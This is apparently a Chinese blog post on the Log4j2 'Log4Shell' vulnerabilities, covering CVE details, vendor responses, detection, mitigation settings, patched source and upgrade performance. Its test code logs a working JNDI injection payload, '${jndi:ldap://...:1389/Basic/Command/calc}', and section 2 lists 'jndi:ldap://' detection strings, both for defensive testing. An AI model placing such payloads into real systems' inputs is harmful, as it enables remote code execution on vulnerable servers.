---
title: log4j漏洞介绍及防护
categories:
- java
tag:
- log4j
---

CVE-2021-45105  CVE-2021-45046  CVE-2021-44832  CVE-2021-44228

## 1.概述
   Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性，被大量用于业务系统开发，用来记录日志信息。
   CVE-2021-44228 远程控制漏洞（RCE）影响从 2.0-beta9 到 2.14.1 的  Log4j  版本。受影响的    Log4j 版本包含 Java 命名和目录接口  (JNDI) 功能，
   可以执行如消息查找替换等操作，攻击者可以通过向易受攻击的系统提交特制的请求，从而完全控制系统，远程执行任意代码，然后进行窃取信息、启动勒索软件或其他恶意活动。
**Apache Log4j2 安全补丁更新过程**
- 2021-12-27 发布版本 2.17.1 
  - 当前安全版本
- 2021-12-18 发布版本 2.17.0 
  - 直接漏洞(CVE-2021-44832)
- 2021-12-13 发布版本 2.16.0 
  - 直接漏洞(CVE-2021-45105   CVE-2021-44832)
- 2021-12-10 发布版本 2.15.0 
  - 直接漏洞(CVE-2021-45105   CVE-2021-45046   CVE-2021-44832)
- 2021-12-10 发布版本 2.14.1(严重漏洞) 
  - 直接漏洞(CVE-2021-45105   CVE-2021-45046   CVE-2021-44832   CVE-2021-44228)
- 2017-09-18 发布版本 2.9.1(严重漏洞) 
  - 直接漏洞(CVE-2021-45105   CVE-2021-45046   CVE-2021-44832   CVE-2021-44228)(无法通过缓解方案解决)

### 1.1 官方说明


- [CVE-2021-44228](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2021-44228)**（Log4j2 初始漏洞）**

     Apache Log4j 2 2.0-beta9 到 2.12.1 和 2.13.0 到 2.15.0 版本的 JNDI 功能在配置、日志消息和参数中使用，无法防止攻击者控制的 LDAP 和其他 JNDI 相关端点。当启用消息查找替换时，控制日志消息或日志消息参数的攻击者可以执行从 LDAP 服务器加载的任意代码。从 log4j 2.15.0 开始，默认情况下已禁用此行为。从版本 2.16.0 开始，此功能已完全删除。请注意，此漏洞特定于 log4j-core，不会影响 log4net、log4cxx 或其他 Apache 日志服务项目。

- [CVE-2021-45046](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2021-45046)**（Log4j 2.15.0 未完整修复的漏洞）**

     Apache Log4j 2.15.0 中针对 CVE-2021-44228 的修复在某些非默认配置中不完整。当日志配置使用非默认模式布局和上下文查找（例如，$${ctx:loginId}）或线程上下文映射模式（ %X、%mdc 或 %MDC）使用 JNDI 查找模式制作恶意输入数据，从而导致拒绝服务 (DOS) 攻击。默认情况下，Log4j 2.15.0 尽最大努力将 JNDI LDAP 查找限制为 localhost。Log4j 2.16.0 通过删除对消息查找模式的支持和默认禁用 JNDI 功能来修复此问题。

- [CVE-2021-4104](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2021-4104)**（Log4j 1.2 版本问题）**

    当攻击者对 Log4j 配置具有写访问权限时，Log4j 1.2 中的 JMSAppender 容易受到不可信数据的反序列化。攻击者可以提供 TopicBindingName 和 TopicConnectionFactoryBindingName 配置，导致 JMSAppender 以类似于 CVE-2021-44228 的方式执行 JNDI 请求，从而导致远程代码执行。
注意， JMSAppender 不是 Log4j 的默认配置，因此此漏洞**仅在特别配置为 JMSAppender 时才会影响 Log4j 1.2**。事实上 Apache Log4j 1.2 已于 2015 年 8 月终止生命周期。用户应该升级到Log4j 2，因为它解决了以前版本的许多其他问题。
​

### 1.2 开源组织

- **已修复/更新：**
   - **Metabase** ：[v0.41.4 发布，解决 log4j2 漏洞问题](https://www.oschina.net/news/173590/metabase-0-41-4-released)
   - **openEuler**：[欧拉开源社区 Log4j 高危安全漏洞修复完成](https://my.oschina.net/openeuler/blog/5359350)
   - **KubeSphere：**[Apache Log4j 2 远程代码执行最新漏洞的修复方案](https://my.oschina.net/u/4197945/blog/5370085)
   - **MateCloud **：[4.2.8 正式版发布，修复 Log4j2 的安全漏洞](https://www.oschina.net/news/173821)
   - **openLooKeng **开源社区： [Apache Log4j2 高危安全漏洞修复完成](https://www.oschina.net/news/173802/openlookeng-log4j2-fix)
   - **JPress** 博客系统：[发布新版，修复 Log4j 漏洞问题](https://www.oschina.net/news/172952/jpress-4-2-0-released)
   - **Netty** ：[4.1.72.Final 发布，更新 Log4j2 版本](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftower.im%2Fteams%2F779130%2Ftodos%2F11874%2FNetty%25204.1.72.Final%2520%25E5%258F%2591%25E5%25B8%2583%25EF%25BC%258C%25E6%259B%25B4%25E6%2596%25B0%2520Log4j2%2520%25E7%2589%2588%25E6%259C%25AC)
   - **Apache NiFi** ：[1.5.1 紧急发布，修复 log4j2 相关问题](https://www.oschina.net/news/173940/apache-nifi-1-5-1-released)
   - **Jedis** ：[3.7.1、4.0.0-rc2 发布，修复 Log4j 安全问题](https://www.oschina.net/news/173389/jedis-4-0-0-rc2-released)
   - **Eurynome Cloud **： [v2.6.2.10 发布，修复 Apache Log4j2 安全问题](https://www.oschina.net/news/173440/eurynome-cloud-2-6-2-10-released)
   - **Jedis**： [3.7.1、4.0.0-rc2 发布，修复 Log4j 安全问题](https://www.oschina.net/news/173389/jedis-4-0-0-rc2-released)
   - **Apache Solr **：[发布漏洞影响情况和缓解措施](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fsolr.apache.org%2Fsecurity.html%23apache-solr-affected-by-apache-log4j-cve-2021-44228)
   - **Minecraft ：**[发布漏洞声明和缓解方案](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.minecraft.net%2Fen-us%2Farticle%2Fimportant-message--security-vulnerability-java-edition)
   - **Apache Flink** ：[关于 Apache Log4j 零日 (CVE-2021-44228) 的建议](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fflink.apache.org%2F2021%2F12%2F10%2Flog4j-cve.html)
   - **Apache Druid**：[建议所有用户升级到 Druid 0.22.1](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Flists.apache.org%2Fthread%2Fr5pf1vf0758cv4pszcz61pbk34kw02y4)
   - **OpenSearch：**[重要提示：更新到 OpenSearch 1.2.1](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fopensearch.org%2Fblog%2Freleases%2F2021%2F12%2Fupdate-to-1-2-1%2F)
   - **OpenNMS：**[受 Apache Log4j 漏洞影响的 OpenNMS 产品](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.opennms.com%2Fen%2Fblog%2F2021-12-10-opennms-products-affected-by-apache-log4j-vulnerability-cve-2021-44228%2F)
   - **IBM Cúram** ：[可能会影响 Cúram Social Program](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.ibm.com%2Fblogs%2Fpsirt%2Fsecurity-bulletin-vulnerability-in-apache-log4j-may-affect-cram-social-program-management-cve-2019-17571%2F)
   - **IBM WebSphere：**[受影响，已更新](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.ibm.com%2Fblogs%2Fpsirt%2Fsecurity-bulletin-vulnerability-in-apache-log4j-affects-websphere-application-server-cve-2021-44228%2F)
- **不受影响：**
   - **Anolis OS**：[不受 Log4j 高危安全漏洞影响](https://my.oschina.net/u/5265430/blog/5361164)
   - **SUSE **：[产品均不受影响](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.suse.com%2Fc%2Fsuse-statement-on-log4j-log4shell-cve-2021-44228-vulnerability%2F)
   - **Apache Spark**：[不受影响](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fissues.apache.org%2Fjira%2Fbrowse%2FSPARK-37630)
   - **Curl / Libcurl **：[不受影响](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftwitter.com%2Fbagder%2Fstatus%2F1470879113116360706)
   - **Zabbix **：[不受影响](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fblog.zabbix.com%2Fzabbix-not-affected-by-the-log4j-exploit%2F17873%2F)
   - **DBeaver **：[Log4j2 漏洞对我们的用户不危险](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fdbeaver.io%2F2021%2F12%2F15%2Flog4shell-vulnerability-is-not-dangerous-for-dbeaver-users%2F)
   - **VideoLAN：**[核心已移植到 Kotlin ，不用 Log4j](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fwww.videolan.org%2Fnews.html%23news-2021-12-15)
   - **Cloudflare：**[Cloudflare 如何安全应对 Log4j 2 漏洞](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fblog.cloudflare.com%2Fzh-cn%2Fhow-cloudflare-security-responded-to-log4j2-vulnerability-zh-cn%2F)
   - **LastPass：**[不受影响](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Fsupport.logmeininc.com%2Flastpass%2Fhelp%2Flog4j-vulnerability-faq-for-lastpass-universal-proxy)
   - **HackerOne**：[不受影响，能利用漏洞影响 H1 的人可获得 25000 美金奖励](https://www.oschina.net/action/GoToLink?url=https%3A%2F%2Ftwitter.com%2Fjobertabma%2Fstatus%2F1469490881854013444)
- ​**发布漏洞相关工具**
   - **360CERT**：[发布Log4j2恶意荷载批量检测调查工具](https://my.oschina.net/u/4600927/blog/5371617)
   - **腾讯容器安全**：[发布开源 Log4j2 漏洞缓解工具](https://www.oschina.net/news/173667)



## 2.初始漏洞说明


-  影响范围
Apache Log4j 2.x <= 2.15.0-rc1
受影响的应用及组件（包括但不限于）如下： Apache Solr、Apache Flink、Apache Druid、Apache Struts2、srping-boot-strater-log4j2等。 
-  攻击检测
可以通过检查日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行为。
检查日志中是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与 jndi 调用相关的堆栈信息。 



## 3.检测代码


- 示例代码


```
public class Log4jErrorTest {

    private static final Logger logger = LogManager.getLogger(Log4jErrorTest.class);
    @Test
    void testLog4jError() throws InterruptedException {
        // -Dlog4j2.formatMsgNoLookups=true jvm参数修复
        final boolean[] sign = {false};
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                logger.error("${jndi:ldap://192.168.1.20:1389/Basic/Command/calc}");
                sign[0] = true;
            }
        });
        thread.start();
        try {
            Thread.sleep(500);
        } catch (Exception e){
            Assertions.assertEquals(true, sign[0]);
        }

        Assertions.assertEquals(true, sign[0]);
    }
}

```


## 4.修正策略

- 升级版本log版本
```
log4j_version=2.16.0

log4j2.15版本未完全解决
```


- 添加jvm参数启动参数
   - log4j版本大于2.10才可用
```
-Dlog4j2.formatMsgNoLookups=true

//启动配置：log4j2.formatMsgNoLookups=True，不建议，不如升级版本
//设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 为 true
```


- 其他修正 
```java

禁止不必要的业务访问外网这个也不建议，影响业务线程阻塞
采用 rasp 对lookup的调用进行阻断
采用waf对请求流量中的${jndi进行拦截

```

## 5.漏洞片段
### 5.1 漏洞堆栈
```
"main" #1 prio=5 os_prio=31 tid=0x00007fc01e807000 nid=0x2703 runnable [0x000070000b944000]
   java.lang.Thread.State: RUNNABLE
	at java.net.PlainSocketImpl.socketConnect(Native Method)
	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)
	- locked <0x0000000796c8d0d0> (a java.net.SocksSocketImpl)
	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)
	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)
	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)
	at java.net.Socket.connect(Socket.java:606)
	at java.net.Socket.connect(Socket.java:555)
	at java.net.Socket.<init>(Socket.java:451)
	at java.net.Socket.<init>(Socket.java:228)
	at com.sun.jndi.ldap.Connection.createSocket(Connection.java:375)
	at com.sun.jndi.ldap.Connection.<init>(Connection.java:215)
	at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
	at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1609)
	at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2749)
	at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:319)
	at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)
	at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:221)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1110)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1033)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)
	at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)
	at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)
	at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:344)
	at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)
	at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)
	at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:540)
	at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:498)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:481)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:456)
	at org.apache.logging.log4j.core.config.DefaultReliabilityStrategy.log(DefaultReliabilityStrategy.java:63)
	at org.apache.logging.log4j.core.Logger.log(Logger.java:161)
	at org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2205)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2159)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2142)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2017)
	at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983)
	at org.apache.logging.log4j.spi.AbstractLogger.error(AbstractLogger.java:740)
	at log4jRCE.main(log4jRCE.java:16)
```
### 5.2 修正策略

- 以2.16.0为例
```java
//jndi关闭策略

public static boolean isJndiEnabled() {
        return PropertiesUtil.getProperties().getBooleanProperty("log4j2.enableJndi", false);
}


//关闭策略

@Override
public JndiManager createManager(final String name, final Properties data) {
    if (isJndiEnabled()) {  // 2021/12/13 修正
        String hosts = data != null ? data.getProperty(ALLOWED_HOSTS) : null;
        String classes = data != null ? data.getProperty(ALLOWED_CLASSES) : null;
        String protocols = data != null ? data.getProperty(ALLOWED_PROTOCOLS) : null;
        List<String> allowedHosts = new ArrayList<>();
        List<String> allowedClasses = new ArrayList<>();
        List<String> allowedProtocols = new ArrayList<>();
        addAll(hosts, allowedHosts, permanentAllowedHosts, ALLOWED_HOSTS, data);
        addAll(classes, allowedClasses, permanentAllowedClasses, ALLOWED_CLASSES, data);
        addAll(protocols, allowedProtocols, permanentAllowedProtocols, ALLOWED_PROTOCOLS, data);
        try {
            return new JndiManager(name, new InitialDirContext(data), allowedHosts, allowedClasses,
                                   allowedProtocols);
        } catch (final NamingException e) {
            LOGGER.error("Error creating JNDI InitialContext.", e);
            return null;
        }
    } else {
        return new JndiManager(name);
    }
}

@SuppressWarnings("unchecked")
public synchronized <T> T lookup(final String name) throws NamingException {
    if (context == null) {  //2021/12/12 修正
        return null;
    }
    try {
        URI uri = new URI(name);
        ...
    } catch (URISyntaxException ex) {
        LOGGER.warn("Invalid JNDI URI - {}", name);
        return null;
    }
    ...
}
//2021/12/12
private JndiManager(final String name) {
    super(null, name);
    this.context = null;
    this.allowedProtocols = null;
    this.allowedClasses = null;
    this.allowedHosts = null;
}

//2021/12/12 修正
if (JndiManager.isJndiEnabled()) {
    try {
        return new JmsManager(name, data);
    } catch (final Exception e) {
        logger().error("Error creating JmsManager using JmsManagerConfiguration [{}]", data, e);
        return null;
    }
} else {
    logger().error("JNDI has not been enabled. The log4j2.enableJndi property must be set to true");
    return null;
}



for (final Map.Entry<String, PluginType<?>> entry : plugins.entrySet()) {
    try {
        final Class<? extends StrLookup> clazz = entry.getValue().getPluginClass().asSubclass(StrLookup.class);
//2021/12/13 修正
        if (!clazz.getName().equals(JndiLookup.class.getName()) || JndiManager.isJndiEnabled()) {
            strLookupMap.put(entry.getKey().toLowerCase(), ReflectionUtil.instantiate(clazz));
        }
    } catch (final Throwable t) {
        handleError(entry.getKey(), t);
    }
}

//2021/12/05
修正MessagePatternConverter
此版本主要为2.15版本修正内容
```
## 6.可能带来问题
### 6.1.日志写入加大性能问题
```
● log4j压测业务服务
  ○ 压测结论升级log4j 2.17.0
    ○ 同步立即刷盘降低2-3倍，改为同步缓存刷盘有少许提升，改为异步较大提升
  ○ 详细压测数据
    ■ log4j-2.8    同   步:  3000/s 
    ■ log4j-2.17.0 同   步:  1200/s
    ■ log4j-2.17.0 同步缓存:  1400/s
    ■ log4j-2.17.0 异步配置:  3300/s
● 问题描述
  ○ 升级log4j后续注意性能问题，写入日志量较多的话会有性能瓶颈，开了同步缓存会缓解一些，改为异步，比原来性能要高一些
● 问题检查
  ○ 检查一下业务线程是否有业务日志线程锁
```
### 6.2.spring升级不动
* 重写log构建

```
public class Log4j2SystemExt extends Log4J2LoggingSystem {
	public static final Map<String, String> SYSTEMS;

	static {
		Map<String, String> systems = new LinkedHashMap<String, String>();
		systems.put("ch.qos.logback.core.Appender",
				"org.springframework.boot.logging.logback.LogbackLoggingSystem");
		systems.put("org.apache.logging.log4j.core.impl.Log4jContextFactory",
				"org.letter.spring.simple.Log4j2SystemExt");
		systems.put("java.util.logging.LogManager",
				"org.springframework.boot.logging.java.JavaLoggingSystem");
		SYSTEMS = Collections.unmodifiableMap(systems);
	}

	private static final String FILE_PROTOCOL = "file";

	public Log4j2SystemExt(ClassLoader classLoader) {
		super(classLoader);
	}

	public static void setExtLoggerSystem() {
		try {
			Class<?> clz = Class.forName("org.springframework.boot.logging.LoggingSystem");
			Field field = clz.getDeclaredField("SYSTEMS");
			field.setAccessible(true);
			Field modifiers = Field.class.getDeclaredField("modifiers");
			modifiers.setAccessible(true);
			modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
			System.out.println("before setExtLoggerSystem: " + field.get(null));
			field.set(null, Log4j2SystemExt.SYSTEMS);
			System.out.println("after setExtLoggerSystem: " + field.get(null));
			modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
		} catch (Exception e) {
			System.out.println("setExtLoggerSystem:" + e.getMessage());
			e.printStackTrace();
		}

	}

	@Override
	protected void loadConfiguration(String location, LogFile logFile) {
		Assert.notNull(location, "Location must not be null");
		try {
			LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
			InputStream is = new ByteArrayInputStream(Log4jXmlConfig.log4jXml.getBytes(StandardCharsets.UTF_8));
			ConfigurationSource source = new ConfigurationSource(is);
			ctx.start(ConfigurationFactory.getInstance().getConfiguration(ctx, source));
		} catch (Exception ex) {
			throw new IllegalStateException(
					"Could not initialize Log4J2 logging from " + location, ex);
		}
	}
// 原有
//	@Override
//	protected void loadConfiguration(String location, LogFile logFile) {
//		Assert.notNull(location, "Location must not be null");
//		try {
//			LoggerContext ctx =  (LoggerContext) LogManager.getContext(false);
//			URL url = ResourceUtils.getURL(location);
//			InputStream stream = url.openStream();
//			ConfigurationSource configurationSource = null;
//			if (FILE_PROTOCOL.equals(url.getProtocol())) {
//				configurationSource = new ConfigurationSource(stream, ResourceUtils.getFile(url));
//			} else {
//				configurationSource = new ConfigurationSource(stream, url);
//			}
//			ctx.start(ConfigurationFactory.getInstance().getConfiguration(ctx, configurationSource));
//		}
//		catch (Exception ex) {
//			throw new IllegalStateException(
//					"Could not initialize Log4J2 logging from " + location, ex);
//		}
//	}
}

```

* 配置

```
Log4j2SystemExt.setExtLoggerSystem();

public class Log4jXmlConfig {
	public static String log4jXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
			"<Configuration status=\"WARN\">\n" +
			"\t<Properties>\n" +
			"\t\t<Property name=\"PID\">????</Property>\n" +
			"\t\t<Property name=\"LOG_EXCEPTION_CONVERSION_WORD\">%xwEx</Property>\n" +
			"\t\t<Property name=\"LOG_LEVEL_PATTERN\">%5p</Property>\n" +
			"\t\t<Property name=\"LOG_PATTERN\">%clr{%d{yyyy-MM-dd HH:mm:ss.SSS}}{faint} %clr{${LOG_LEVEL_PATTERN}} %clr{${sys:PID}}{magenta} %clr{---}{faint} %clr{[%15.15t]}{faint} %clr{%-40.40c{1.}}{cyan} %clr{:}{faint} %m%n${sys:LOG_EXCEPTION_CONVERSION_WORD}</Property>\n" +
			"\t</Properties>\n" +
			"\t<Appenders>\n" +
			"\t\t<Console name=\"Console\" target=\"SYSTEM_OUT\" follow=\"true\">\n" +
			"\t\t\t<PatternLayout pattern=\"${LOG_PATTERN}\" />\n" +
			"\t\t</Console>\n" +
			"\t</Appenders>\n" +
			"\t<Loggers>\n" +
			"\t\t<Logger name=\"org.apache.catalina.startup.DigesterFactory\" level=\"error\" />\n" +
			"\t\t<Logger name=\"org.apache.catalina.util.LifecycleBase\" level=\"error\" />\n" +
			"\t\t<Logger name=\"org.apache.coyote.http11.Http11NioProtocol\" level=\"warn\" />\n" +
			"\t\t<logger name=\"org.apache.sshd.common.util.SecurityUtils\" level=\"warn\"/>\n" +
			"\t\t<Logger name=\"org.apache.tomcat.util.net.NioSelectorPool\" level=\"warn\" />\n" +
			"\t\t<Logger name=\"org.crsh.plugin\" level=\"warn\" />\n" +
			"\t\t<logger name=\"org.crsh.ssh\" level=\"warn\"/>\n" +
			"\t\t<Logger name=\"org.eclipse.jetty.util.component.AbstractLifeCycle\" level=\"error\" />\n" +
			"\t\t<Logger name=\"org.hibernate.validator.internal.util.Version\" level=\"warn\" />\n" +
			"\t\t<logger name=\"org.springframework.boot.actuate.autoconfigure.CrshAutoConfiguration\" level=\"warn\"/>\n" +
			"\t\t<logger name=\"org.springframework.boot.actuate.endpoint.jmx\" level=\"warn\"/>\n" +
			"\t\t<logger name=\"org.thymeleaf\" level=\"warn\"/>\n" +
			"\t\t<Root level=\"info\">\n" +
			"\t\t\t<AppenderRef ref=\"Console\" />\n" +
			"\t\t</Root>\n" +
			"\t</Loggers>\n" +
			"</Configuration>";
}


```
## 7.参考
[https://www.oschina.net/news/174145/all-response-to-log4shell](https://www.oschina.net/news/174145/all-response-to-log4shell)


